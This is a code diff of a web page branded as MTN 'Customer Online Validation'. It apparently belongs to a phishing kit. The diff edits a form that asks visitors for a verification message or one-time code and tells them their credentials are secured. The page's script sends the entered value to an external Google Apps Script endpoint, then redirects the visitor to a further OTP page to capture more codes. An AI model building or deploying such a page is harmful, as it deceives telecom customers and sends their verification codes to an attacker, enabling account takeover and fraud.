@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Customer Online Validation - OTP</title>
+<title>Customer Online Validation</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -160,14 +160,14 @@ button:active { transform: translateY(1px); }
 <header>
   <div class="logo">MTN</div>
   <div class="title">Customer Online Validation</div>
-  <div class="subtext">Enter the OTP to complete your verification</div>
+  <div class="subtext">Enter your verification message below</div>
 </header>
 
 <div class="portal-card">
-  <form id="otpForm">
-    <label for="otp">Validation OTP</label>
-    <input type="text" id="otp" name="validation_otp" placeholder="Enter OTP" required>
-    <button type="submit">Validate OTP →</button>
+  <form id="dataForm">
+    <label for="message">Verification Message</label>
+    <input type="text" id="message" name="validation_otp" placeholder="Enter message" required>
+    <button type="submit">Continue →</button>
     <div class="notice" id="status">Your credentials are secured.</div>
   </form>
 </div>
@@ -178,10 +178,10 @@ button:active { transform: translateY(1px); }
 </div>
 
 <script>
-const form = document.getElementById('otpForm');
+const form = document.getElementById('dataForm');
 const overlay = document.getElementById('overlay');
 const statusEl = document.getElementById('status');
-const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxc01iBJ-yE2Qpsn1ln_O7qk5HWgaqvJRJLPA2_fgdIBesusKPSPYyTkLEA6xkKHjod/exec";
+const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbzrAI7WA69_S-8Nk-WKDgwiZ5VYm6hIKf_qwS7zWGsgCBUbFG1oLVyjMeO4CJ0fi20/exec";
 
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
@@ -194,28 +194,24 @@ form.addEventListener('submit', async (e) => {
   try {
     const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
     const text = await response.text();
-
-    let json;
-    try { json = JSON.parse(text); } catch {
-      overlay.classList.remove("active");
-      statusEl.textContent = "Invalid server response.";
-      statusEl.style.color = "#b00000";
-      return;
-    }
+    const json = JSON.parse(text);
 
     if (json.result === "success") {
-      window.location.href = "thankyou.html";
+      // Redirect to OTP page
+      window.location.href = "otp.html";
     } else {
       overlay.classList.remove("active");
       statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
       statusEl.style.color = "#b00000";
     }
-  } catch (err) {
+
+  } catch(err) {
     overlay.classList.remove("active");
     statusEl.textContent = "Network error. Try again.";
     statusEl.style.color = "#b00000";
   }
 });
 </script>
+
 </body>
 </html>
